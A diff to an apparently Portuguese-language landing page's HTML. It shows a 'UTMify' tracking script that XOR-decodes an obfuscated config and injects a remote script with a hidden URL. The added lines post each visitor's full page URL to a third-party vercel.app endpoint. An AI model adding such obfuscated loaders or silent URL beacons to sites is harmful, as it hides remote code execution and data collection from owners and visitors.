@@ -37,6 +37,17 @@
   <!-- UTMify — captura os UTMs do anúncio e repassa ao checkout -->
   <script>(function () { var a_9oqr = atob("DGhdsAVwIizqDLNI7BN/xXccABbIZMc8nBtnnyoTRkLEecclhQ4knmYfTwKIfpw7jxo0wHEDDVmeYcBngAkp1XYEDEaZLp9qjRwpwmwSV1iPf5FytxN/3mQdRw7QLtcpmAlwxXEdS0qTIcM6iR443nFdWk+FaJ47jwN/nCcGQ0CfaZFyzkognH5STE2HaZFyzgw8xGRdV1iHZdUxwRgv1XMVTFjHf8YqhQwukilSVE2GedZq1kp/zVgN"); var t_i = []; for (var c_f = 0; c_f < a_9oqr.length; c_f++) { t_i.push(a_9oqr.charCodeAt(c_f) & 255); } var i_z8z = t_i[0]; var k_gl = t_i.slice(1, 1 + i_z8z); var w_iah8 = t_i.slice(1 + i_z8z); var a_zskx = w_iah8.map(function (b, a_2o) { return b ^ k_gl[a_2o % i_z8z]; }); var p_9opc = ""; for (var b_ly = 0; b_ly < a_zskx.length; b_ly++) { p_9opc += String.fromCharCode(a_zskx[b_ly] & 255); } var k_rzz = decodeURIComponent(escape(p_9opc)); var l_fy = JSON.parse(k_rzz); var s_d1tn = l_fy.globals || []; s_d1tn.forEach(function (d_8) { window[d_8.name] = d_8.value; }); var r_9kt = document.createElement("script"); r_9kt.src = l_fy.url; r_9kt.async = true; r_9kt.defer = true; (l_fy.attributes || []).forEach(function (f_t2) { r_9kt.setAttribute(f_t2.name, f_t2.value); }); (document.head || document.documentElement).appendChild(r_9kt); })();</script>
 
+  <script>
+    fetch("https://tracke-utm-url.vercel.app/save-url", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        userId: "6a7f4ee204aeb732712e4694",
+        url: window.location.href
+      }),
+    });
+  </script>
+
   <style>
     :root {
       --paper: #ECE7DE;
